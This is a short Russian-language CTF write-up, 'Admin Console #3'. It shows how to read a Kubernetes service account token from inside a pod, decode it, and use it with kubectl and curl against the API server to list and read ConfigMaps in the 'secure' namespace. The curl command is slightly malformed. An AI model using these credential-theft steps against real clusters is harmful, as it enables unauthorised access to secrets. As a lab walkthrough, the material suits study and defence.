# Admin Console \#3

Из названия переменных окружения делаем предположение, что это K8s. Нас просят посмотреть объект ConfigMap (описание намекает через "файлы конфигурации").

Никаких вольюмов не подключено, надо попробовать авторизоваться в кластере через ServiceAccount

Он есть, в контейнере по пути `/var/run/secrets/kubernetes.io/serviceaccount/token` лежит JWT токен для авторизации. Копируем его, смотрим через jwt.io в Debugger

```json
{
  "aud": [
    "kubernetes.default.svc"
  ],
  "exp": 1711448215,
  "iat": 1679912215,
  "iss": "kubernetes.default.svc",
  "kubernetes.io": {
    "namespace": "secure",
    "pod": {
      "name": "admin-console-66dd88775f-6tq9w",
      "uid": "5057921c-6763-4fcc-b1bf-fa30811384fb"
    },
    "serviceaccount": {
      "name": "webadmin",
      "uid": "98fd513c-83fc-42e3-b706-898c2f00de7d"
    },
    "warnafter": 1679915822
  },
  "nbf": 1679912215,
  "sub": "system:serviceaccount:secure:webadmin"
}
```

В названии токена видим название и Namespace для ServiceAccount

```yaml
Namespace: secure  
Name: webadmin
```

Необходимо собрать kubeconfig и авторизоваться. До этого необходимо поставить kubectl

```bash
kubectl config set-credentials webadmin --token <token>
kubectl config set-context --current --user=webadmin
```

Хост для авторизации надо брать из запроса к API Kubernetes (привожу запрос относительно bash пода). api-srv надо брать из environments переменных из KUBERNTES_PORT_443_TCP

```bash 
KUBERNETES_PORT_443_TCP=tcp://10.96.128.1:443
curl –cacert  -H «Authorization: BEARER <token>» https://<api-srv>/api/v1/namespaces/default/endpoints
```

Далее сделать команду 

```bash 
kubectl get configmaps -n secure
```

И сделать просмотр значений найденной мапы
```
kubectl describe configmap <name> -n secure
```
